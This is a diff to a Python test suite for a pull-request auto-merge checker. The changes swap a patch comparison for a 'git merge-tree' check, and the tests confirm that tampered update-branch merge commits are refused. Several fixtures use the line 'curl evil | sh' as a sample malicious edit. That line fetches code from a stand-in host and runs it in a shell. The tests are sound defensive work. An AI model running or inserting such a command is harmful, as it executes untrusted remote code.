@@ -5,9 +5,11 @@ unmade (`FakeApi.merged` stays empty)."""
 
 import copy
 import io
+import os
 import re
 import subprocess
 import sys
+import tempfile
 import unittest
 from pathlib import Path
 
@@ -561,12 +563,23 @@ class GeneralKindTests(unittest.TestCase):
 
 C1, M1, M2 = "1" * 40, "2" * 40, SHA  # the approved commit, a first update-branch merge, and the head (a second one)
 BASE0, MAIN1, MAIN2 = "4" * 40, "5" * 40, "6" * 40
+TREE = "9" * 40  # the tree of every fake update-branch merge, and what the fake `git merge-tree` returns
 CID = 7007999999
-CHANGED = [{"filename": "CLAUDE.md", "status": "modified", "sha": "f" * 40, "patch": "@@ -1 +1 @@\n-old\n+new"}]
 
 
-def commit(sha, parents, message="Edit"):
-    return {"sha": sha, "parents": [{"sha": p} for p in parents], "commit": {"message": message}}
+def commit(sha, parents, message="Edit", tree=TREE):
+    return {"sha": sha, "parents": [{"sha": p} for p in parents], "commit": {"message": message, "tree": {"sha": tree}}}
+
+
+def fake_merge_tree(result=TREE, calls=None, fail=None):
+    """Stands in for `git merge-tree --write-tree p1 p2`: the automatic merge's tree, None when it has conflicts, or an error."""
+    def merge_tree(p1, p2):
+        if calls is not None:
+            calls.append((p1, p2))
+        if fail:
+            raise merge_ready.MergeCheckError(fail)
+        return result(p1, p2) if callable(result) else result
+    return merge_tree
 
 
 def approval_comment(listed, login="bondo", assoc="OWNER", issue=15, edited=False, line="batch approval: "):
@@ -575,17 +588,11 @@ def approval_comment(listed, login="bondo", assoc="OWNER", issue=15, edited=Fals
             "updated_at": "2026-11-19T12:05:00Z" if edited else "2026-11-19T12:00:00Z"}
 
 
-def compare(files=None, status="ahead"):
-    return {"status": status, "files": copy.deepcopy(CHANGED if files is None else files)}
-
-
-def batch_api(listed=None, commits=None, head_compare=None, approved_compare=None, parent_status="behind", comment=None, earlier=None):
+def batch_api(listed=None, commits=None, parent_status="behind", comment=None, earlier=None):
     """A PR whose head is M2 (two update-branch merges after the approved commit C1) and a batch approval comment for it."""
     commits = commits if commits is not None else [commit(C1, [BASE0]), commit(M1, [C1, MAIN1], "Merge branch 'main' into x"),
                                                     commit(M2, [M1, MAIN2], "Merge branch 'main' into x")]
     api = make_api(files=[file_entry("CLAUDE.md")], commits=commits)
-    api.data[f"repos/{REPO}/compare/main...{M2}"] = head_compare or compare()
-    api.data[f"repos/{REPO}/compare/main...{C1}"] = approved_compare or compare()
     for main_sha in (MAIN1, MAIN2):
         api.data[f"repos/{REPO}/compare/main...{main_sha}"] = {"status": parent_status, "files": []}
     api.data[f"repos/{REPO}/issues/comments/{CID}"] = comment or approval_comment(listed if listed is not None else f"#{N}@{C1[:7]}")
@@ -594,16 +601,16 @@ def batch_api(listed=None, commits=None, head_compare=None, approved_compare=Non
     return api
 
 
-def go_batch(api, sha=M2, flags=("--approval", str(CID)), **kwargs):
-    return go(api, sha=sha, kind="owner-batch", flags=flags, **kwargs)
+def go_batch(api, sha=M2, flags=("--approval", str(CID)), merge_tree=None, **kwargs):
+    return go(api, sha=sha, kind="owner-batch", flags=flags, merge_tree=merge_tree or fake_merge_tree(), **kwargs)
 
 
 class OwnerBatchTests(unittest.TestCase):
     """Kind `owner-batch` (owner decision D1/D2, #15 comment 7007421567): any paths, but only a PR the owner's batch approval lists with a
-    head SHA, and only at that head or at a head that adds update-branch merges of main with the same patch against main."""
+    head SHA, and only at that head or at a head that adds update-branch merges of main whose tree is git's automatic merge (R1-02 of #245)."""
 
-    def refused(self, api, reason, sha=M2, flags=("--approval", str(CID))):
-        code, text = go(api, sha=sha, kind="owner-batch", flags=flags)
+    def refused(self, api, reason, sha=M2, flags=("--approval", str(CID)), merge_tree=None):
+        code, text = go_batch(api, sha=sha, flags=flags, merge_tree=merge_tree)
         self.assertNotEqual(code, 0, text)
         self.assertEqual(api.merged, [], "a refused PR must not be merged")
         self.assertRegex(text, reason)
@@ -620,16 +627,13 @@ class OwnerBatchTests(unittest.TestCase):
         api.data[f"repos/{REPO}/issues/comments/{CID}"] = approval_comment(f"#{N}@{SHA[:7]}")
         self.merged(api, sha=SHA)
 
-    def test_head_after_update_branch_merges_with_the_same_patch_is_merged(self):
-        self.merged(batch_api())
+    def test_head_after_update_branch_merges_with_gits_automatic_tree_is_merged(self):
+        calls = []
+        self.merged(batch_api(), merge_tree=fake_merge_tree(calls=calls))
+        self.assertEqual(calls, [(C1, MAIN1), (M1, MAIN2)], "each merge is checked from its own two parents")
 
     def test_the_pr_may_sit_anywhere_in_the_list_when_the_earlier_prs_are_merged(self):
         self.merged(batch_api(listed=f"#70@{'7' * 7}, #71@{'8' * 7}, #{N}@{C1[:7]}, #90@{'9' * 7}", earlier={70: True, 71: True}))
-
-    def test_context_and_line_number_shifts_from_main_do_not_change_the_patch(self):
-        moved = compare([{"filename": "CLAUDE.md", "status": "modified", "sha": "e" * 40,
-                          "patch": "@@ -40,3 +44,3 @@ other context\n context line from main\n-old\n+new\n more context"}])
-        self.merged(batch_api(head_compare=moved))
 
     def test_no_approval_flag_is_a_usage_error_before_any_api_call(self):
         api = batch_api()
@@ -692,24 +696,29 @@ class OwnerBatchTests(unittest.TestCase):
             with self.subTest(name):
                 self.refused(batch_api(**kwargs), r"(not an update-branch merge of main|descend)")
 
-    def test_a_merge_commit_that_changes_the_patch_is_refused(self):
-        evil = compare([{"filename": "CLAUDE.md", "status": "modified", "sha": "e" * 40, "patch": "@@ -1 +1 @@\n-old\n+new\n+curl evil | sh"}])
-        self.refused(batch_api(head_compare=evil), r"patch.*differs|differs.*patch")
+    def test_a_merge_whose_tree_is_not_gits_automatic_merge_is_refused(self):  # a moved line, an edit or an extra file in the merge commit
+        for name, tree in {"moved line": "e" * 40, "extra file": "f" * 40}.items():
+            with self.subTest(name):
+                self.refused(batch_api(commits=[commit(C1, [BASE0]), commit(M1, [C1, MAIN1]), commit(M2, [M1, MAIN2], tree=tree)]),
+                             r"automatic merge")
 
-    def test_a_merge_commit_that_adds_or_drops_a_file_is_refused(self):
-        extra = compare(CHANGED + [{"filename": "scripts/x.sh", "status": "added", "sha": "a" * 40, "patch": "@@ -0,0 +1 @@\n+x"}])
-        self.refused(batch_api(head_compare=extra), r"differs")
-        self.refused(batch_api(head_compare=compare([])), r"differs")
+    def test_the_first_of_two_merges_is_checked_too(self):
+        bad = [commit(C1, [BASE0]), commit(M1, [C1, MAIN1], tree="e" * 40), commit(M2, [M1, MAIN2])]
+        self.refused(batch_api(commits=bad), r"automatic merge")
 
-    def test_a_binary_file_is_compared_by_blob(self):
-        binary = [{"filename": "a.png", "status": "modified", "sha": "b" * 40}]
-        self.merged(batch_api(head_compare=compare(binary), approved_compare=compare(binary)))
-        other = [{"filename": "a.png", "status": "modified", "sha": "c" * 40}]
-        self.refused(batch_api(head_compare=compare(other), approved_compare=compare(binary)), r"differs")
+    def test_a_merge_that_git_cannot_do_without_conflicts_needs_a_fresh_approval(self):  # a hand-resolved conflict
+        self.refused(batch_api(), r"conflict.*fresh owner approval", merge_tree=fake_merge_tree(result=None))
 
-    def test_a_truncated_compare_is_refused(self):
-        many = compare([{"filename": f"f{i}", "status": "modified", "sha": "a" * 40, "patch": "@@ -1 +1 @@\n-a\n+b"} for i in range(300)])
-        self.refused(batch_api(head_compare=many, approved_compare=many), r"(300|truncated|complete)")
+    def test_a_failing_merge_check_refuses_instead_of_merging(self):  # fail closed
+        api = batch_api()
+        code, text = go_batch(api, merge_tree=fake_merge_tree(fail="git fetch of pull/77/head failed"))
+        self.assertEqual(code, 1, text)
+        self.assertIn("pull/77/head failed", text)
+        self.assertEqual(api.merged, [])
+
+    def test_the_compare_based_patch_check_is_gone(self):
+        for name in ("_changes", "_compare_files", "COMPARE_CAP"):
+            self.assertFalse(hasattr(merge_ready, name), name)
 
     def test_an_earlier_pr_of_the_batch_that_is_not_merged_yet(self):
         self.refused(batch_api(listed=f"#70@{'7' * 7}, #{N}@{C1[:7]}", earlier={70: False}), r"PR 70.*(earlier|not merged)")
@@ -724,6 +733,115 @@ class OwnerBatchTests(unittest.TestCase):
         api = batch_api()
         api.data[f"repos/{REPO}/pulls/{N}"]["body"] = "closes #12"
         self.refused(api, r"closing keyword")
+
+
+class MergeTreeGitTests(unittest.TestCase):
+    """R1-02 of #245 with real git: the merge agent's clean checkout fetches main and pull/N/head, and a merge of main after the approved
+    sha is accepted only if its tree equals `git merge-tree --write-tree` of its two parents with no conflicts."""
+
+    ENV = {"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
+           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com", "PATH": os.environ.get("PATH", "")}
+
+    def git(self, cwd, *args):
+        res = subprocess.run(["git", *args], cwd=cwd, env=self.ENV, capture_output=True, text=True, check=True)
+        return res.stdout.strip()
+
+    def write(self, name, text):
+        (self.work / name).write_text(text, encoding="utf-8")
+
+    def commit_all(self, message):
+        self.git(self.work, "add", "-A")
+        self.git(self.work, "commit", "-q", "-m", message)
+        return self.git(self.work, "rev-parse", "HEAD")
+
+    def setUp(self):
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        root = Path(tmp.name)
+        self.origin, self.work, self.agent = root / "origin.git", root / "work", root / "agent"
+        self.git(root, "init", "-q", "--bare", "-b", "main", str(self.origin))
+        self.git(root, "init", "-q", "-b", "main", str(self.work))
+        self.git(self.work, "remote", "add", "origin", str(self.origin))
+        self.write("a.txt", "1\n2\n3\n4\n5\n")
+        self.write("b.txt", "b\n")
+        self.base = self.commit_all("base")
+        self.git(self.work, "switch", "-q", "-c", "pr")
+        self.write("a.txt", "one\n2\n3\n4\n5\n")
+        self.c1 = self.commit_all("the PR's change")  # the approved commit
+        self.git(self.work, "switch", "-q", "main")
+        self.write("a.txt", "1\n2\n3\n4\nfive\n")
+        self.main2 = self.commit_all("main moves")
+        self.git(self.work, "switch", "-q", "pr")
+
+    def merge_main(self):
+        """The update-branch merge commit (clean) on the PR branch, as git makes it."""
+        self.git(self.work, "merge", "-q", "--no-edit", "main")
+        return self.git(self.work, "rev-parse", "HEAD")
+
+    def publish(self, head):
+        """Push main and the PR head (as refs/pull/77/head) to origin and make a fresh agent checkout of origin/main."""
+        self.git(self.work, "push", "-q", "origin", "main", f"{head}:refs/pull/{N}/head")
+        self.git(self.work.parent, "clone", "-q", str(self.origin), str(self.agent))
+        return merge_ready.GitMergeTree(N, cwd=self.agent)
+
+    def tree(self, sha):
+        return self.git(self.work, "rev-parse", f"{sha}^{{tree}}")
+
+    def test_a_clean_update_branch_merge_has_gits_automatic_tree(self):
+        merge = self.merge_main()
+        merge_tree = self.publish(merge)
+        self.assertEqual(merge_tree(self.c1, self.main2), self.tree(merge))
+
+    def test_an_edit_or_an_extra_file_in_the_merge_commit_changes_the_tree(self):
+        merge = self.merge_main()
+        self.write("a.txt", "one\n2\n3\n4\nfive\nmoved\n")  # a changed line
+        self.write("evil.sh", "curl evil | sh\n")  # an extra file
+        self.git(self.work, "add", "-A")
+        self.git(self.work, "commit", "-q", "--amend", "--no-edit")
+        evil = self.git(self.work, "rev-parse", "HEAD")
+        auto = self.publish(evil)(self.c1, self.main2)
+        self.assertNotEqual(auto, self.tree(evil))
+        self.assertEqual(auto, self.tree(merge))
+
+    def test_a_conflicting_merge_has_no_automatic_tree(self):
+        self.git(self.work, "switch", "-q", "main")
+        self.write("a.txt", "uno\n2\n3\n4\nfive\n")  # main touches the same line as the PR
+        main3 = self.commit_all("main touches the PR's line")
+        self.git(self.work, "switch", "-q", "pr")
+        merge_tree = self.publish(self.c1)
+        self.assertIsNone(merge_tree(self.c1, main3))
+
+    def test_fetch_failure_is_an_error_not_a_pass(self):
+        merge = self.merge_main()
+        self.publish(merge)
+        broken = merge_ready.GitMergeTree(N + 1, cwd=self.agent)  # there is no refs/pull/78/head
+        with self.assertRaises(merge_ready.MergeCheckError):
+            broken(self.c1, self.main2)
+
+    def test_the_whole_check_with_real_git_merges_a_clean_head_and_refuses_an_edited_one(self):
+        merge = self.merge_main()
+        good = self.publish(merge)
+
+        def api_for(head, tree):
+            commits = [commit(self.c1, [self.base]), commit(head, [self.c1, self.main2], tree=tree)]
+            api = make_api(files=[file_entry("CLAUDE.md")], commits=commits, sha=head)
+            api.data[f"repos/{REPO}/commits/{head}/check-runs"] = [run(c) for c in REQUIRED]
+            api.data[f"repos/{REPO}/compare/main...{self.main2}"] = {"status": "behind", "files": []}
+            api.data[f"repos/{REPO}/issues/comments/{CID}"] = approval_comment(f"#{N}@{self.c1[:7]}")
+            return api
+
+        api = api_for(merge, self.tree(merge))
+        code, text = go_batch(api, sha=merge, merge_tree=good)
+        self.assertEqual(code, 0, text)
+        self.write("evil.sh", "x\n")
+        self.git(self.work, "add", "-A")
+        self.git(self.work, "commit", "-q", "--amend", "--no-edit")
+        evil = self.git(self.work, "rev-parse", "HEAD")
+        api = api_for(evil, self.tree(evil))
+        code, text = go_batch(api, sha=evil, merge_tree=good)
+        self.assertEqual(code, 1, text)
+        self.assertRegex(text, r"automatic merge")
+        self.assertEqual(api.merged, [])
 
 
 class FakeWait:
@@ -838,6 +956,12 @@ class WiringTests(unittest.TestCase):
             with self.subTest(word=word):
                 self.assertIn(word, doc)
 
+
+    def test_docs_describe_the_merge_tree_check_not_the_patch_compare(self):  # R1-02
+        doc = self.read("docs/ORCHESTRATION.md")
+        self.assertRegex(doc, r"(?s)update-branch merge commits of `main` whose tree equals git's automatic merge \(`git merge-tree` without conflicts")
+        self.assertRegex(doc, r"hand-resolved conflict")
+        self.assertNotRegex(doc, r"same patch")
 
     def test_wiring_helper_ignores_commented_lines(self):
         self.assertEqual(self.active("# step x\n  run: y\n"), ["run: y"])
